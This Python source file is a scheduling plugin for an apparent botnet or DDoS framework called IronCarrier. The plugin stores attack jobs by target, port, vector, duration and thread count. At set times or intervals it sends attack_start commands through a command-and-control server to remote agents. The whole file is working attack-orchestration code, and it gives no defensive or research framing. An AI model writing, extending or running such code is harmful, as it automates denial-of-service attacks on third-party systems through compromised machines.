#!/usr/bin/env python3
"""
Auto Schedule Plugin
Schedule attacks at specific times or intervals
"""

import time
import threading
from typing import Dict, Any, List, Optional
from datetime import datetime, timedelta
from dataclasses import dataclass, field

import sys
import os
sys.path.insert(0, os.path.join(os.path.dirname(__file__), '../..'))

from plugins.api import PluginInterface, PluginMetadata, PluginContext, PluginConfig


@dataclass
class ScheduledJob:
    """Scheduled attack job"""
    job_id: str
    target: str
    port: int
    vector: str
    duration: int
    threads: int
    scheduled_time: Optional[datetime] = None
    interval_seconds: Optional[float] = None
    repeat: bool = False
    max_runs: int = 0
    run_count: int = 0
    last_run: Optional[datetime] = None
    enabled: bool = True
    options: Dict = field(default_factory=dict)


class AutoSchedule(PluginInterface):
    """Auto scheduling plugin"""
    
    def __init__(self):
        self.config = None
        self.context = None
        self._jobs: Dict[str, ScheduledJob] = {}
        self._running = False
        self._thread: Optional[threading.Thread] = None
        self._lock = threading.Lock()
        self._check_interval = 5.0
    
    def get_metadata(self) -> PluginMetadata:
        return PluginMetadata(
            name='auto_schedule',
            version='1.0.0',
            description='Schedule attacks at specific times or intervals',
            author='IronCarrier',
            tags=['scheduling', 'automation', 'attacks'],
            priority=50,
        )
    
    def on_load(self, context: PluginContext) -> None:
        self.context = context
        self.config = PluginConfig('auto_schedule')
        self.config.set_default('check_interval', 5.0)
        self.config.set_default('enabled', True)
        self.config.set_default('jobs', [])
        
        if context.config and 'auto_schedule' in context.config:
            self.config.load(context.config['auto_schedule'])
        
        # Load saved jobs
        saved_jobs = self.config.get('jobs', [])
        for job_data in saved_jobs:
            if job_data.get('scheduled_time'):
                job_data['scheduled_time'] = datetime.fromisoformat(job_data['scheduled_time'])
            if job_data.get('last_run'):
                job_data['last_run'] = datetime.fromisoformat(job_data['last_run'])
            job = ScheduledJob(**{k: v for k, v in job_data.items() if k in ScheduledJob.__dataclass_fields__})
            self._jobs[job.job_id] = job
        
        self._running = self.config.get('enabled', True)
        self._check_interval = self.config.get('check_interval', 5.0)
        
        if self._running:
            self._start_scheduler()
    
    def on_unload(self) -> None:
        self._running = False
        self._save_jobs()
    
    def _save_jobs(self) -> None:
        if not self.config:
            return
        
        jobs_data = []
        for job in self._jobs.values():
            jd = {
                'job_id': job.job_id,
                'target': job.target,
                'port': job.port,
                'vector': job.vector,
                'duration': job.duration,
                'threads': job.threads,
                'repeat': job.repeat,
                'max_runs': job.max_runs,
                'run_count': job.run_count,
                'enabled': job.enabled,
                'options': job.options,
            }
            if job.scheduled_time:
                jd['scheduled_time'] = job.scheduled_time.isoformat()
            if job.last_run:
                jd['last_run'] = job.last_run.isoformat()
            if job.interval_seconds:
                jd['interval_seconds'] = job.interval_seconds
            jobs_data.append(jd)
        
        self.config.set('jobs', jobs_data)
    
    def _start_scheduler(self) -> None:
        if self._thread and self._thread.is_alive():
            return
        
        self._thread = threading.Thread(target=self._scheduler_loop, daemon=True)
        self._thread.start()
    
    def _scheduler_loop(self) -> None:
        while self._running:
            now = datetime.now()
            
            with self._lock:
                for job in list(self._jobs.values()):
                    if not job.enabled:
                        continue
                    
                    should_run = False
                    
                    if job.scheduled_time:
                        if now >= job.scheduled_time:
                            should_run = True
                    elif job.interval_seconds:
                        if job.last_run:
                            next_run = job.last_run + timedelta(seconds=job.interval_seconds)
                            if now >= next_run:
                                should_run = True
                        else:
                            should_run = True
                    
                    if should_run:
                        if job.max_runs > 0 and job.run_count >= job.max_runs:
                            job.enabled = False
                            continue
                        
                        self._execute_job(job)
                        job.last_run = now
                        job.run_count += 1
                        
                        if job.repeat and job.interval_seconds:
                            job.scheduled_time = now + timedelta(seconds=job.interval_seconds)
                        elif not job.repeat:
                            job.enabled = False
            
            self._save_jobs()
            time.sleep(self._check_interval)
    
    def _execute_job(self, job: ScheduledJob) -> bool:
        if not self.context or not self.context.c2_server:
            if self.context:
                self.context.log('error', 'No C2 server for scheduled job')
            return False
        
        from ironcarrier.c2.protocol import CommandBuilder
        
        # Find an available agent
        agents = self.context.get_agents()
        if not agents:
            if self.context:
                self.context.log('warn', f'No agents for scheduled job {job.job_id}')
            return False
        
        agent_id = agents[0].get('agent_id', '')
        
        msg = CommandBuilder.attack_start(
            vector=job.vector,
            target=job.target,
            port=job.port,
            duration=job.duration,
            threads=job.threads,
            **job.options
        )
        
        success = self.context.send_to_agent(agent_id, msg)
        
        if self.context:
            self.context.log('info', f"Scheduled job {job.job_id} executed on {agent_id}")
        
        return success
    
    def add_job(self, job: ScheduledJob) -> str:
        with self._lock:
            self._jobs[job.job_id] = job
        self._save_jobs()
        return job.job_id
    
    def remove_job(self, job_id: str) -> bool:
        with self._lock:
            if job_id in self._jobs:
                del self._jobs[job_id]
                self._save_jobs()
                return True
        return False
    
    def get_jobs(self) -> List[Dict]:
        with self._lock:
            return [
                {
                    'job_id': j.job_id,
                    'target': j.target,
                    'port': j.port,
                    'vector': j.vector,
                    'duration': j.duration,
                    'threads': j.threads,
                    'scheduled_time': j.scheduled_time.isoformat() if j.scheduled_time else None,
                    'interval': j.interval_seconds,
                    'repeat': j.repeat,
                    'max_runs': j.max_runs,
                    'run_count': j.run_count,
                    'last_run': j.last_run.isoformat() if j.last_run else None,
                    'enabled': j.enabled,
                }
                for j in self._jobs.values()
            ]
    
    def get_config(self) -> Dict:
        return self.config.to_dict() if self.config else {}
    
    def set_config(self, config: Dict) -> None:
        if self.config:
            self.config.load(config)


plugin = AutoSchedule()
